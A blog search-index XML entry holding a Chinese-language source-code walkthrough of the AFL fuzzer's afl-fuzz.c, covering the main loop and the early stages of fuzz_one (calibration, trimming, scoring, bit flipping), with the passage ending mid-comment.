<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>AFL源码分析(四)</title>
    <link href="/2023/10/04/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%9B%9B/"/>
    <url>/2023/10/04/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL源码分析-四"><a href="#AFL源码分析-四" class="headerlink" title="AFL源码分析(四)"></a>AFL源码分析(四)</h1><h2 id="afl-fuzz-c"><a href="#afl-fuzz-c" class="headerlink" title="afl-fuzz.c"></a>afl-fuzz.c</h2><h3 id="main函数主循环"><a href="#main函数主循环" class="headerlink" title="main函数主循环"></a>main函数主循环</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><br>   u8 skipped_fuzz;<br><br>   cull_queue();       <span class="hljs-comment">// 精简队列</span><br><br>   <span class="hljs-keyword">if</span> (!queue_cur) &#123;   <span class="hljs-comment">// 如果queue_cur为空，代表所有queue都被执行完一轮</span><br><br>     queue_cycle++;    <span class="hljs-comment">// 所有queue被完整执行了多少轮</span><br>     current_entry     = <span class="hljs-number">0</span>;<br>     cur_skipped_paths = <span class="hljs-number">0</span>;<br>     queue_cur         = <span class="hljs-built_in">queue</span>;        <span class="hljs-comment">// 开始新一轮fuzz</span><br><br>     <span class="hljs-keyword">while</span> (seek_to) &#123;         <span class="hljs-comment">// resume fuzz</span><br>       current_entry++;<br>       seek_to--;<br>       queue_cur = queue_cur-&gt;next;    <span class="hljs-comment">// 从seek_to指定的queue项开始执行</span><br>     &#125;<br><br>     show_stats();     <span class="hljs-comment">// 显示stat信息</span><br><br>     <span class="hljs-keyword">if</span> (not_on_tty) &#123;<br>       ACTF(<span class="hljs-string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);<br>       fflush(<span class="hljs-built_in">stdout</span>);<br>     &#125;<br><br>     <span class="hljs-comment">/* If we had a full queue cycle with no new finds, try</span><br><span class="hljs-comment">        recombination strategies next. */</span><br><br>     <span class="hljs-keyword">if</span> (queued_paths == prev_queued) &#123;        <span class="hljs-comment">// 代表在完整的一轮执行里都没有发现任何一个新的case</span><br><br>       <span class="hljs-keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="hljs-keyword">else</span> use_splicing = <span class="hljs-number">1</span>;     <span class="hljs-comment">// 若use_splicing为1(通过-d参数设置)，代表接下来要通过splice重组queue里的case</span><br><br>     &#125; <span class="hljs-keyword">else</span> cycles_wo_finds = <span class="hljs-number">0</span>;<br><br>     prev_queued = queued_paths;       <span class="hljs-comment">// 设置prev_queued为当前发现的queued_paths</span><br><br>     <span class="hljs-keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="hljs-number">1</span> &amp;&amp; getenv(<span class="hljs-string">&quot;AFL_IMPORT_FIRST&quot;</span>))    <span class="hljs-comment">// 若sync_id不为空，且queue_cycle等于1</span><br>       sync_fuzzers(use_argv);         <span class="hljs-comment">// 读取其他sync文件夹下的queue，保存到主queue中</span><br><br>   &#125;<br><br>   skipped_fuzz = fuzz_one(use_argv);  <span class="hljs-comment">// 对queue_cur进行测试，若不执行返回1，否则返回0</span><br><br>   <span class="hljs-keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;       <span class="hljs-comment">// 若stop_soon为空，sync_id不为空，skipped_fuzz为空</span><br>     <br>     <span class="hljs-keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))       <span class="hljs-comment">// 同步sync文件夹下的queue</span><br>       sync_fuzzers(use_argv);<br><br>   &#125;<br><br>   <span class="hljs-keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="hljs-number">2</span>;    <span class="hljs-comment">// 若stop_soon为空，exit_1不为空，设置stop_soon为2</span><br><br>   <span class="hljs-keyword">if</span> (stop_soon) <span class="hljs-keyword">break</span>;       <span class="hljs-comment">// 跳出死循环唯一途径</span><br><br>   queue_cur = queue_cur-&gt;next;        <span class="hljs-comment">// 设置queue_cur为queue_cur的next</span><br>   current_entry++;<br><br> &#125;<br><br></code></pre></td></tr></table></figure><h3 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one"></a>fuzz_one</h3><p>fuzz_one作为fuzz的核心函数，主要有以下几个阶段：</p><ul><li>前期准备阶段</li><li>CALIBRATION阶段</li><li>TRIMMING阶段</li><li>PERFORMANCE SCORE阶段</li><li>SIMPLE BITFLIP (+dictionary construction) 简单位翻转</li><li>ARITHMETIC INC&#x2F;DEC 算术加减</li><li>INTERESTING VALUES</li><li>DICTIONARY STUFF</li><li>RANDOM HAVOC</li><li>SPLICING</li><li>后期收尾阶段</li></ul><h4 id="前期准备阶段"><a href="#前期准备阶段" class="headerlink" title="前期准备阶段"></a>前期准备阶段</h4><p>根据概率判断是否开启fuzz，建立文件映射，建立输出缓冲区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take the current entry from the queue, fuzz it for a while. This</span><br><span class="hljs-comment">   function is a tad too long... returns 0 if fuzzed successfully, 1 if</span><br><span class="hljs-comment">   skipped or bailed out. */</span><br><br><span class="hljs-type">static</span> u8 <span class="hljs-title function_">fuzz_one</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  s32 len, fd, temp_len, i, j;<br>  u8  *in_buf, *out_buf, *orig_in, *ex_tmp, *eff_map = <span class="hljs-number">0</span>;<br>  u64 havoc_queued,  orig_hit_cnt, new_hit_cnt;<br>  u32 splice_cycle = <span class="hljs-number">0</span>, perf_score = <span class="hljs-number">100</span>, orig_perf, prev_cksum, eff_cnt = <span class="hljs-number">1</span>;<br><br>  u8  ret_val = <span class="hljs-number">1</span>, doing_det = <span class="hljs-number">0</span>;<br><br>  u8  a_collect[MAX_AUTO_EXTRA];<br>  u32 a_len = <span class="hljs-number">0</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> IGNORE_FINDS</span><br><br>  <span class="hljs-comment">/* In IGNORE_FINDS mode, skip any entries that weren&#x27;t in the</span><br><span class="hljs-comment">     initial data set. */</span><br>  <span class="hljs-comment">// 在IGNORE_FINDS模式下，跳过所有不在初始数据集中的条目。</span><br>  <br>  <span class="hljs-keyword">if</span> (queue_cur-&gt;depth &gt; <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>  <span class="hljs-keyword">if</span> (pending_favored) &#123;        <span class="hljs-comment">// pending_favored不为空的条件下，若was_fuzzed不为空，或者favored为空，则99%概率直接返回1</span><br><br>    <span class="hljs-comment">/* If we have any favored, non-fuzzed new arrivals in the queue,</span><br><span class="hljs-comment">       possibly skip to them at the expense of already-fuzzed or non-favored</span><br><span class="hljs-comment">       cases. */</span><br><br>    <span class="hljs-keyword">if</span> ((queue_cur-&gt;was_fuzzed || !queue_cur-&gt;favored) &amp;&amp;<br>        UR(<span class="hljs-number">100</span>) &lt; SKIP_TO_NEW_PROB) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;   <span class="hljs-comment">// 99%</span><br><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;favored &amp;&amp; queued_paths &gt; <span class="hljs-number">10</span>) &#123;  <span class="hljs-comment">// 若不是简易模式，favored为空，且queued_paths大于10</span><br><br>    <span class="hljs-comment">/* Otherwise, still possibly skip non-favored cases, albeit less often.</span><br><span class="hljs-comment">       The odds of skipping stuff are higher for already-fuzzed inputs and</span><br><span class="hljs-comment">       lower for never-fuzzed entries. */</span><br><br>    <span class="hljs-keyword">if</span> (queue_cycle &gt; <span class="hljs-number">1</span> &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;    <span class="hljs-comment">// 若queue_cycle大于1，且queue_cur没有被fuzz过，75%概率直接返回1</span><br><br>      <span class="hljs-keyword">if</span> (UR(<span class="hljs-number">100</span>) &lt; SKIP_NFAV_NEW_PROB) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;       <span class="hljs-comment">// 75%</span><br><br>    &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-comment">// 否则queue_cur被fuzz过，95%概率返回1</span><br><br>      <span class="hljs-keyword">if</span> (UR(<span class="hljs-number">100</span>) &lt; SKIP_NFAV_OLD_PROB) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;       <span class="hljs-comment">// 95%</span><br><br>    &#125;<br><br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^IGNORE_FINDS */</span></span><br><br>  <span class="hljs-keyword">if</span> (not_on_tty) &#123;     <span class="hljs-comment">// 若不是在tty终端</span><br>    ACTF(<span class="hljs-string">&quot;Fuzzing test case #%u (%u total, %llu uniq crashes found)...&quot;</span>,<br>         current_entry, queued_paths, unique_crashes);  <span class="hljs-comment">// 打印路径，crash信息</span><br>    fflush(<span class="hljs-built_in">stdout</span>);     <span class="hljs-comment">// 刷新stdout缓冲区</span><br>  &#125;<br><br>  <span class="hljs-comment">/* Map the test case into memory. */</span><br><br>  fd = open(queue_cur-&gt;fname, O_RDONLY);        <span class="hljs-comment">// 以只读模式打开queue_cur-&gt;fname，即打开测试文件</span><br><br>  <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, queue_cur-&gt;fname);<br><br>  len = queue_cur-&gt;len;<br><br>  orig_in = in_buf = mmap(<span class="hljs-number">0</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 建立可读可写的文件映射</span><br><br>  <span class="hljs-keyword">if</span> (orig_in == MAP_FAILED) PFATAL(<span class="hljs-string">&quot;Unable to mmap &#x27;%s&#x27;&quot;</span>, queue_cur-&gt;fname);<br><br>  close(fd);    <span class="hljs-comment">// 关闭queue_cur-&gt;fname</span><br><br>  <span class="hljs-comment">/* We could mmap() out_buf as MAP_PRIVATE, but we end up clobbering every</span><br><span class="hljs-comment">     single byte anyway, so it wouldn&#x27;t give us any performance or memory usage</span><br><span class="hljs-comment">     benefits. */</span><br>  <br>  out_buf = ck_alloc_nozero(len);       <span class="hljs-comment">// 建立输出缓冲区</span><br><br>  subseq_tmouts = <span class="hljs-number">0</span>;<br><br>  cur_depth = queue_cur-&gt;depth;<br></code></pre></td></tr></table></figure><h4 id="CALIBRATION"><a href="#CALIBRATION" class="headerlink" title="CALIBRATION"></a>CALIBRATION</h4><p>若评估失败，且评估次数小于3次，再次评估测试用例。根据评估用例判断是否继续进行fuzz。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (queue_cur-&gt;cal_failed) &#123;  <span class="hljs-comment">// case存在评估错误</span><br><br>    u8 res = FAULT_TMOUT;<br><br>    <span class="hljs-keyword">if</span> (queue_cur-&gt;cal_failed &lt; CAL_CHANCES) &#123;  <span class="hljs-comment">// 小于3次，再次校准</span><br><br>      <span class="hljs-comment">/* Reset exec_cksum to tell calibrate_case to re-execute the testcase</span><br><span class="hljs-comment">         avoiding the usage of an invalid trace_bits.</span><br><span class="hljs-comment">         For more info: https://github.com/AFLplusplus/AFLplusplus/pull/425 */</span><br><br>      queue_cur-&gt;exec_cksum = <span class="hljs-number">0</span>;<br><br>      res = calibrate_case(argv, queue_cur, in_buf, queue_cycle - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);        <span class="hljs-comment">// 再次评估测试用例</span><br><br>      <span class="hljs-keyword">if</span> (res == FAULT_ERROR)   <span class="hljs-comment">// 若res为FAULT_ERROR，报错并推出</span><br>        FATAL(<span class="hljs-string">&quot;Unable to execute target application&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (stop_soon || res != crash_mode) &#123;       <span class="hljs-comment">// 若stop_soon不为空，或者res不等于crash_mode</span><br>      cur_skipped_paths++;      <span class="hljs-comment">// cur_skipped_paths + 1</span><br>      <span class="hljs-keyword">goto</span> abandon_entry;       <span class="hljs-comment">// 跳转到abandon_entry</span><br>    &#125;<br><br>  &#125;<br></code></pre></td></tr></table></figure><h4 id="TRIMMING"><a href="#TRIMMING" class="headerlink" title="TRIMMING"></a>TRIMMING</h4><p>对queue_cur进行剪枝，初始化out_buf。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;trim_done) &#123;    <span class="hljs-comment">// 若不是简易模式，且queue_cur还未被trim过</span><br><br>   u8 res = trim_case(argv, queue_cur, in_buf);        <span class="hljs-comment">// 对queue_cur进行trim</span><br><br>   <span class="hljs-keyword">if</span> (res == FAULT_ERROR)      <span class="hljs-comment">// 若res为FAULT_ERROR，报错并推出</span><br>     FATAL(<span class="hljs-string">&quot;Unable to execute target application&quot;</span>);<br><br>   <span class="hljs-keyword">if</span> (stop_soon) &#123;    <span class="hljs-comment">// 若stop_soon不为空</span><br>     cur_skipped_paths++;<br>     <span class="hljs-keyword">goto</span> abandon_entry;<br>   &#125;<br><br>   <span class="hljs-comment">/* Don&#x27;t retry trimming, even if it failed. */</span><br><br>   queue_cur-&gt;trim_done = <span class="hljs-number">1</span>;   <span class="hljs-comment">// 设置queue_cur的trim标志</span><br><br>   <span class="hljs-keyword">if</span> (len != queue_cur-&gt;len) len = queue_cur-&gt;len;    <span class="hljs-comment">// trim后更新queue长度</span><br><br> &#125;<br><br> <span class="hljs-built_in">memcpy</span>(out_buf, in_buf, len); <span class="hljs-comment">// 将in_buf长度为len的内容拷贝到out_buf</span><br></code></pre></td></tr></table></figure><h4 id="PERFORMANCE-SCORE"><a href="#PERFORMANCE-SCORE" class="headerlink" title="PERFORMANCE SCORE"></a>PERFORMANCE SCORE</h4><p>计算测试用例得分，进行简单的deterministic。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">orig_perf = perf_score = calculate_score(queue_cur);  <span class="hljs-comment">// 计算queue_cur的得分</span><br><br>  <span class="hljs-comment">/* Skip right away if -d is given, if we have done deterministic fuzzing on</span><br><span class="hljs-comment">     this entry ourselves (was_fuzzed), or if it has gone through deterministic</span><br><span class="hljs-comment">     testing in earlier, resumed runs (passed_det). */</span><br><br>  <span class="hljs-keyword">if</span> (skip_deterministic || queue_cur-&gt;was_fuzzed || queue_cur-&gt;passed_det)     <br>    <span class="hljs-keyword">goto</span> havoc_stage;   <span class="hljs-comment">// 若跳过deterministic，或者已经被fuzz过，或者已经经过deterministic了，跳转到havoc_stage</span><br><br>  <span class="hljs-comment">/* Skip deterministic fuzzing if exec path checksum puts this out of scope</span><br><span class="hljs-comment">     for this master instance. */</span><br>  <span class="hljs-comment">// 跳过从fuzz的确定性fuzz</span><br>  <span class="hljs-keyword">if</span> (master_max &amp;&amp; (queue_cur-&gt;exec_cksum % master_max) != master_id - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">goto</span> havoc_stage;<br><br>  doing_det = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><h4 id="SIMPLE-BITFLIP-dictionary-construction"><a href="#SIMPLE-BITFLIP-dictionary-construction" class="headerlink" title="SIMPLE BITFLIP (+dictionary construction)"></a>SIMPLE BITFLIP (+dictionary construction)</h4><p>对out_buf做简单的位翻转。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> FLIP_BIT(_ar, _b) do &#123; \</span><br><span class="hljs-meta">    u8* _arf = (u8*)(_ar); \</span><br><span class="hljs-meta">    u32 _bf = (_b); \</span><br><span class="hljs-meta">    _arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf) &amp; 7)); \</span><br><span class="hljs-meta">  &#125; while (0)   <span class="hljs-comment">// 对每一个byte进行逐位取反操作</span></span><br><br>  <span class="hljs-comment">/* Single walking bit. */</span><br>  <br>  stage_short = <span class="hljs-string">&quot;flip1&quot;</span>;<br>  stage_max   = len &lt;&lt; <span class="hljs-number">3</span>;<br>  stage_name  = <span class="hljs-string">&quot;bitflip 1/1&quot;</span>;<br><br>  stage_val_type = STAGE_VAL_NONE;<br><br>  orig_hit_cnt = queued_paths + unique_crashes;<br><br>  prev_cksum = queue_cur-&gt;exec_cksum;<br><br>  <span class="hljs-keyword">for</span> (stage_cur = <span class="hljs-number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;     <span class="hljs-comment">// 循环stage_max轮次</span><br><br>    stage_cur_byte = stage_cur &gt;&gt; <span class="hljs-number">3</span>;<br>  <br>    FLIP_BIT(out_buf, stage_cur);       <span class="hljs-comment">// out_buf按位取反</span><br><br>    <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len))  <span class="hljs-comment">// 调用common_fuzz_stuff进行fuzz，保存interesting种子</span><br>        <span class="hljs-keyword">goto</span> abandon_entry;<br><br>    FLIP_BIT(out_buf, stage_cur);       <span class="hljs-comment">// 翻转回来</span><br><br>    <span class="hljs-comment">/* While flipping the least significant bit in every byte, pull of an extra</span><br><span class="hljs-comment">       trick to detect possible syntax tokens. In essence, the idea is that if</span><br><span class="hljs-comment">       you have a binary blob like this:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       xxxxxxxxIHDRxxxxxxxx</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       ...and changing the leading and trailing bytes causes variable or no</span><br><span class="hljs-comment">       changes in program flow, but touching any character in the 